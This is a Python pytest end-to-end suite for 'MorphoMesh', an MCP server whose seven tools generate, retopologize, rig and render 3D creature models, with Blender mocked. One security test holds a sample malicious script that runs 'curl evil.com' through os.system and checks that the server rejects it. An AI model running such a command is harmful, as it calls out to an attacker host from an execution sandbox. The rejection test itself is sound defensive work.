"""
MorphoMesh: End-to-End (E2E) Offline FastMCP Integration Test Suite.

Verifies end-to-end execution of all 7 authoritative MCP tools via an authentic
in-memory FastMCP ClientSession (JSON-RPC 2.0 protocol boundary) in offline mode:
- Stage 1: morphomesh_generate_concept
- Stage 2: morphomesh_create_3d_asset
- Stage 3: morphomesh_optimize_topology
- Stage 4: morphomesh_auto_rig
- Stage 5: morphomesh_blender_execute (safe execution & security violation)
- Stage 5: morphomesh_get_scene_status
- Stage 5: morphomesh_render_preview
- Complete 5-Stage Procedural Pipeline Chain
"""

from __future__ import annotations

import base64
import json
import os
import shutil
from collections.abc import Callable
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock

import pytest
from PIL import Image

from morphomesh.server import blender_bridge


def parse_tool_result(result) -> dict[str, Any]:
    """Extract and parse JSON dictionary from MCP Tool Call result."""
    if hasattr(result, "structuredContent") and result.structuredContent and "result" in result.structuredContent:
        return result.structuredContent["result"]
    for content_block in result.content:
        if getattr(content_block, "type", None) == "text":
            try:
                return json.loads(content_block.text)
            except json.JSONDecodeError:
                pass
    return {}


@pytest.mark.asyncio
async def test_e2e_list_all_seven_tools(mcp_session_factory: Callable):
    """Verify tools/list endpoint returns all 7 tools through the client session."""
    async with mcp_session_factory() as mcp_client:
        tools_response = await mcp_client.list_tools()
        tool_names = [t.name for t in tools_response.tools]
        assert len(tool_names) == 7
        expected = {
            "morphomesh_generate_concept",
            "morphomesh_create_3d_asset",
            "morphomesh_optimize_topology",
            "morphomesh_auto_rig",
            "morphomesh_blender_execute",
            "morphomesh_get_scene_status",
            "morphomesh_render_preview",
        }
        assert set(tool_names) == expected


@pytest.mark.asyncio
async def test_e2e_stage1_generate_concept(mcp_session_factory: Callable, temp_storage_dir: Path):
    """Verify Tool 1: morphomesh_generate_concept synthesizes 2D concept and alpha mask."""
    async with mcp_session_factory() as mcp_client:
        arguments = {
            "prompt": "Frost wyrm dragon with ice scales, standing neutral pose",
            "creature_type": "winged",
            "view_mode": "front",
            "width": 512,
            "height": 512,
            "seed": 101,
        }
        res = await mcp_client.call_tool("morphomesh_generate_concept", arguments=arguments)
        assert res.isError is False

        data = parse_tool_result(res)
        assert data["concept_id"].startswith("concept-")
        assert data["creature_type"] == "winged"
        assert data["dimensions"] == [512, 512]
        assert data["seed_used"] == 101
        assert data["status"] == "mock_success"

        # Verify concept image on disk
        image_path = data["image_path"]
        assert os.path.isfile(image_path)
        with Image.open(image_path) as img:
            assert img.format == "PNG"
            assert img.size == (512, 512)

        # Verify RGBA image on disk
        rgba_path = data["rgba_image_path"]
        assert os.path.isfile(rgba_path)
        with Image.open(rgba_path) as rgba_img:
            assert rgba_img.format == "PNG"
            assert rgba_img.mode == "RGBA"


@pytest.mark.asyncio
async def test_e2e_stage2_create_3d_asset(mcp_session_factory: Callable, temp_storage_dir: Path):
    """Verify Tool 2: morphomesh_create_3d_asset reconstructs 3D mesh and bakes PBR textures."""
    async with mcp_session_factory() as mcp_client:
        arguments = {
            "concept_id": "concept-e2e-chimera",
            "model_backend": "mock",
            "export_format": "glb",
            "generate_pbr": True,
            "texture_resolution": 512,
        }
        res = await mcp_client.call_tool("morphomesh_create_3d_asset", arguments=arguments)
        assert res.isError is False

        data = parse_tool_result(res)
        assert data["asset_id"].startswith("asset-")
        assert data["format"] == "glb"
        assert data["vertex_count"] > 0
        assert data["face_count"] > 0
        assert data["has_pbr_materials"] is True
        assert data["backend_used"] == "mock"

        mesh_path = data["mesh_path"]
        assert os.path.isfile(mesh_path)
        assert Path(mesh_path).read_bytes()[:4] == b"glTF"

        # Verify textures
        for map_key in ["albedo", "normal", "roughness", "metallic"]:
            assert map_key in data["texture_paths"]
            tex_file = data["texture_paths"][map_key]
            assert os.path.isfile(tex_file)
            with Image.open(tex_file) as t_img:
                assert t_img.format == "PNG"
                assert t_img.size == (512, 512)


@pytest.mark.asyncio
async def test_e2e_stage3_optimize_topology(
    mcp_session_factory: Callable,
    sample_mesh_glb: str,
    monkeypatch: pytest.MonkeyPatch,
):
    """Verify Tool 3: morphomesh_optimize_topology retopologizes geometry."""
    mock_response = {
        "optimized_asset_id": "opt-e2e-8888",
        "output_mesh_path": sample_mesh_glb.replace(".glb", "_opt.glb"),
        "original_vertex_count": 8500,
        "original_face_count": 17000,
        "optimized_vertex_count": 3200,
        "optimized_face_count": 3100,
        "quad_percentage": 97.2,
        "reduction_ratio": 0.182,
        "uv_preserved": True,
        "processing_time_seconds": 1.45,
    }
    monkeypatch.setattr(blender_bridge, "execute", MagicMock(return_value=mock_response))

    async with mcp_session_factory() as mcp_client:
        arguments = {
            "input_mesh_path": sample_mesh_glb,
            "target_poly_count": 3100,
            "topology_type": "quad_dominant",
            "method": "quadriflow",
            "output_format": "glb",
        }
        res = await mcp_client.call_tool("morphomesh_optimize_topology", arguments=arguments)
        assert res.isError is False

        data = parse_tool_result(res)
        assert data["optimized_asset_id"] == "opt-e2e-8888"
        assert data["optimized_face_count"] == 3100
        assert data["quad_percentage"] == 97.2
        assert data["uv_preserved"] is True


@pytest.mark.asyncio
async def test_e2e_stage4_auto_rig(
    mcp_session_factory: Callable,
    sample_mesh_glb: str,
    monkeypatch: pytest.MonkeyPatch,
):
    """Verify Tool 4: morphomesh_auto_rig generates armature and binds skin weights."""
    mock_rig = {
        "rigged_asset_id": "rig-e2e-4444",
        "blend_file_path": None,
        "exported_mesh_path": "/tmp/rigged.fbx",
        "armature_name": "Armature_Quadruped_Direwolf",
        "bone_count": 26,
        "bone_hierarchy": ["root", "spine_01", "neck", "head", "front_leg.L", "front_leg.R"],
        "creature_type": "quadruped",
        "has_skin_weights": True,
        "test_action_name": "Action_Quadruped_IdlePose",
        "status": "success",
    }
    monkeypatch.setattr(blender_bridge, "execute", MagicMock(return_value=mock_rig))

    async with mcp_session_factory() as mcp_client:
        arguments = {
            "input_mesh_path": sample_mesh_glb,
            "creature_type": "quadruped",
            "rig_type": "rigify_creature",
            "skinning_method": "automatic_weights",
        }
        res = await mcp_client.call_tool("morphomesh_auto_rig", arguments=arguments)
        assert res.isError is False

        data = parse_tool_result(res)
        assert data["rigged_asset_id"] == "rig-e2e-4444"
        assert data["armature_name"] == "Armature_Quadruped_Direwolf"
        assert data["bone_count"] == 26
        assert data["has_skin_weights"] is True


@pytest.mark.asyncio
async def test_e2e_stage5_blender_execute_safe(
    mcp_session_factory: Callable,
    monkeypatch: pytest.MonkeyPatch,
):
    """Verify Tool 5: morphomesh_blender_execute evaluates safe bpy operations."""
    mock_exec = {
        "success": True,
        "stdout": "Info: Translation applied\n",
        "stderr": "",
        "returned_data": {"new_z": 3.14},
        "blend_file_path": None,
    }
    monkeypatch.setattr(blender_bridge, "execute", MagicMock(return_value=mock_exec))

    safe_script = """
import bpy
new_z = 3.14
"""
    async with mcp_session_factory() as mcp_client:
        arguments = {
            "script": safe_script,
            "timeout_seconds": 10,
            "return_variables": ["new_z"],
        }
        res = await mcp_client.call_tool("morphomesh_blender_execute", arguments=arguments)
        assert res.isError is False

        data = parse_tool_result(res)
        assert data["success"] is True
        assert data["returned_data"] == {"new_z": 3.14}


@pytest.mark.asyncio
async def test_e2e_stage5_blender_execute_security_rejection(mcp_session_factory: Callable):
    """Verify Tool 5: morphomesh_blender_execute intercepts dangerous scripts via AST."""
    malicious_script = "import os\nos.system('curl evil.com')"
    async with mcp_session_factory() as mcp_client:
        res = await mcp_client.call_tool("morphomesh_blender_execute", arguments={"script": malicious_script})
        assert res.isError is True
        error_text = res.content[0].text
        assert "ERR_SCRIPT_SECURITY_VIOLATION" in error_text
        assert "Forbidden module import: 'os'" in error_text


@pytest.mark.asyncio
async def test_e2e_stage5_get_scene_status(
    mcp_session_factory: Callable,
    monkeypatch: pytest.MonkeyPatch,
):
    """Verify Tool 6: morphomesh_get_scene_status retrieves scene statistics."""
    mock_status = {
        "scene_name": "CreatureScene",
        "blender_version": "5.2.1",
        "active_object": "Direwolf_Mesh",
        "object_count": 3,
        "total_vertices": 3200,
        "total_faces": 3100,
        "objects": [
            {
                "name": "Direwolf_Mesh",
                "type": "MESH",
                "location": [0.0, 0.0, 0.0],
                "rotation_euler": [0.0, 0.0, 0.0],
                "scale": [1.0, 1.0, 1.0],
                "parent": "Armature_Quadruped",
                "children": [],
                "vertex_count": 3200,
                "face_count": 3100,
                "triangle_count": 6200,
                "materials": ["M_Direwolf"],
                "modifiers": ["Armature"],
            }
        ],
        "armatures": [{"name": "Armature_Quadruped", "bone_count": 26}],
        "cameras": [{"name": "StudioCamera", "lens_focal_length": 50.0}],
        "lights": [{"name": "KeyLight", "type": "AREA", "energy": 500.0}],
    }
    monkeypatch.setattr(blender_bridge, "execute", MagicMock(return_value=mock_status))

    async with mcp_session_factory() as mcp_client:
        arguments = {"include_mesh_stats": True, "include_armatures": True}
        res = await mcp_client.call_tool("morphomesh_get_scene_status", arguments=arguments)
        assert res.isError is False

        data = parse_tool_result(res)
        assert data["scene_name"] == "CreatureScene"
        assert data["blender_version"] == "5.2.1"
        assert data["object_count"] == 3
        assert data["total_vertices"] == 3200
        assert len(data["objects"]) == 1
        assert data["objects"][0]["name"] == "Direwolf_Mesh"


@pytest.mark.asyncio
async def test_e2e_stage5_render_preview(
    mcp_session_factory: Callable,
    temp_storage_dir: Path,
    monkeypatch: pytest.MonkeyPatch,
):
    """Verify Tool 7: morphomesh_render_preview generates rendered image and base64 preview."""
    render_file = temp_storage_dir / "renders" / "e2e_preview.png"
    img = Image.new("RGBA", (512, 512), (100, 140, 180, 255))
    img.save(str(render_file))

    mock_render = {
        "image_path": str(render_file),
        "image_format": "png",
        "resolution": [512, 512],
        "render_engine": "BLENDER_EEVEE",
        "samples": 64,
        "render_time_seconds": 0.42,
        "view_angle": "three_quarter",
        "lighting_preset": "studio_three_point",
    }
    monkeypatch.setattr(blender_bridge, "execute", MagicMock(return_value=mock_render))

    async with mcp_session_factory() as mcp_client:
        arguments = {
            "resolution_width": 512,
            "resolution_height": 512,
            "render_engine": "BLENDER_EEVEE_NEXT",  # Expect auto-normalization
            "view_angle": "three_quarter",
            "samples": 64,
        }
        res = await mcp_client.call_tool("morphomesh_render_preview", arguments=arguments)
        assert res.isError is False

        data = parse_tool_result(res)
        assert data["image_format"] == "png"
        assert data["render_engine"] == "BLENDER_EEVEE"
        assert data["resolution"] == [512, 512]
        assert "base64_image" in data
        assert len(data["base64_image"]) > 50

        # Verify base64 decode
        decoded_bytes = base64.b64decode(data["base64_image"])
        assert len(decoded_bytes) == os.path.getsize(str(render_file))


@pytest.mark.asyncio
async def test_e2e_full_five_stage_creature_pipeline_chain(
    mcp_session_factory: Callable,
    temp_storage_dir: Path,
    monkeypatch: pytest.MonkeyPatch,
):
    """
    Execute the entire 5-Stage Creature Generation Pipeline through FastMCP:
    Stage 1: Prompt -> Concept Image
    Stage 2: Concept Image -> 3D Mesh & PBR Textures
    Stage 3: Dense Mesh -> Topology Optimization
    Stage 4: Clean Mesh -> Auto-Rigging Armature
    Stage 5: Scene Assembly Inspection & Turntable Render
    """
    async with mcp_session_factory() as mcp_client:
        # STAGE 1: Concept Synthesis
        s1_res = await mcp_client.call_tool(
            "morphomesh_generate_concept",
            arguments={
                "prompt": "Celestial direwolf with crystalline antlers and frost armor",
                "creature_type": "quadruped",
                "view_mode": "front",
                "pose": "standing_neutral",
                "width": 512,
                "height": 512,
                "seed": 2026,
            },
        )
        assert s1_res.isError is False
        s1_data = parse_tool_result(s1_res)
        concept_id = s1_data["concept_id"]
        concept_img_path = s1_data["image_path"]
        assert os.path.isfile(concept_img_path)

        # STAGE 2: 3D Asset Creation (GLB + PBR Textures)
        s2_res = await mcp_client.call_tool(
            "morphomesh_create_3d_asset",
            arguments={
                "concept_id": concept_id,
                "image_path": concept_img_path,
                "model_backend": "mock",
                "export_format": "glb",
                "generate_pbr": True,
                "texture_resolution": 512,
            },
        )
        assert s2_res.isError is False
        s2_data = parse_tool_result(s2_res)
        asset_id = s2_data["asset_id"]
        mesh_path = s2_data["mesh_path"]
        assert os.path.isfile(mesh_path)
        assert s2_data["has_pbr_materials"] is True

        # STAGE 3: Topology Optimization
        opt_mesh_path = mesh_path.replace(".glb", "_opt.glb")
        shutil.copyfile(mesh_path, opt_mesh_path)

        mock_retopo = {
            "optimized_asset_id": f"opt-{asset_id}",
            "output_mesh_path": opt_mesh_path,
            "original_vertex_count": s2_data["vertex_count"],
            "original_face_count": s2_data["face_count"],
            "optimized_vertex_count": 4500,
            "optimized_face_count": 4400,
            "quad_percentage": 95.8,
            "reduction_ratio": 0.22,
            "uv_preserved": True,
            "processing_time_seconds": 1.15,
        }
        monkeypatch.setattr(blender_bridge, "execute", MagicMock(return_value=mock_retopo))

        s3_res = await mcp_client.call_tool(
            "morphomesh_optimize_topology",
            arguments={
                "asset_id": asset_id,
                "input_mesh_path": mesh_path,
                "target_poly_count": 4400,
                "topology_type": "quad_dominant",
            },
        )
        assert s3_res.isError is False
        s3_data = parse_tool_result(s3_res)
        assert s3_data["optimized_face_count"] == 4400

        # STAGE 4: Auto-Rigging
        mock_rig = {
            "rigged_asset_id": f"rig-{asset_id}",
            "blend_file_path": None,
            "exported_mesh_path": opt_mesh_path.replace(".glb", ".fbx"),
            "armature_name": "Armature_Quadruped_Celestial",
            "bone_count": 34,
            "bone_hierarchy": ["root", "spine_01", "spine_02", "neck", "head", "tail_01"],
            "creature_type": "quadruped",
            "has_skin_weights": True,
            "test_action_name": "Action_Quadruped_IdlePose",
            "status": "success",
        }
        monkeypatch.setattr(blender_bridge, "execute", MagicMock(return_value=mock_rig))

        s4_res = await mcp_client.call_tool(
            "morphomesh_auto_rig",
            arguments={
                "asset_id": asset_id,
                "creature_type": "quadruped",
                "rig_type": "rigify_creature",
            },
        )
        assert s4_res.isError is False
        s4_data = parse_tool_result(s4_res)
        assert s4_data["bone_count"] == 34
        assert s4_data["has_skin_weights"] is True

        # STAGE 5: Scene Verification & Render Preview
        mock_status = {
            "scene_name": "Scene",
            "blender_version": "5.2.1",
            "active_object": "Armature_Quadruped_Celestial",
            "object_count": 4,
            "total_vertices": 4500,
            "total_faces": 4400,
            "objects": [
                {
                    "name": "Celestial_Wolf_Mesh",
                    "type": "MESH",
                    "location": [0.0, 0.0, 0.0],
                    "rotation_euler": [0.0, 0.0, 0.0],
                    "scale": [1.0, 1.0, 1.0],
                    "parent": "Armature_Quadruped_Celestial",
                    "children": [],
                    "vertex_count": 4500,
                    "face_count": 4400,
                    "triangle_count": 8800,
                    "materials": ["M_CelestialWolf_PBR"],
                    "modifiers": ["Armature"],
                }
            ],
            "armatures": [{"name": "Armature_Quadruped_Celestial", "bone_count": 34}],
            "cameras": [{"name": "MorphoMesh_AutoCam", "lens_focal_length": 50.0}],
            "lights": [{"name": "KeyLight", "type": "AREA", "energy": 500.0}],
        }
        monkeypatch.setattr(blender_bridge, "execute", MagicMock(return_value=mock_status))

        s5a_res = await mcp_client.call_tool("morphomesh_get_scene_status", arguments={})
        assert s5a_res.isError is False
        s5a_data = parse_tool_result(s5a_res)
        assert s5a_data["total_faces"] == 4400

        final_render_png = temp_storage_dir / "renders" / "final_turntable.png"
        Image.new("RGBA", (512, 512), (180, 200, 220, 255)).save(str(final_render_png))

        mock_render = {
            "image_path": str(final_render_png),
            "image_format": "png",
            "resolution": [512, 512],
            "render_engine": "BLENDER_EEVEE",
            "samples": 64,
            "render_time_seconds": 0.68,
            "view_angle": "three_quarter",
            "lighting_preset": "studio_three_point",
        }
        monkeypatch.setattr(blender_bridge, "execute", MagicMock(return_value=mock_render))

        s5b_res = await mcp_client.call_tool(
            "morphomesh_render_preview",
            arguments={"resolution_width": 512, "resolution_height": 512, "view_angle": "three_quarter"},
        )
        assert s5b_res.isError is False
        s5b_data = parse_tool_result(s5b_res)
        assert s5b_data["image_format"] == "png"
        assert s5b_data["render_engine"] == "BLENDER_EEVEE"
        assert "base64_image" in s5b_data
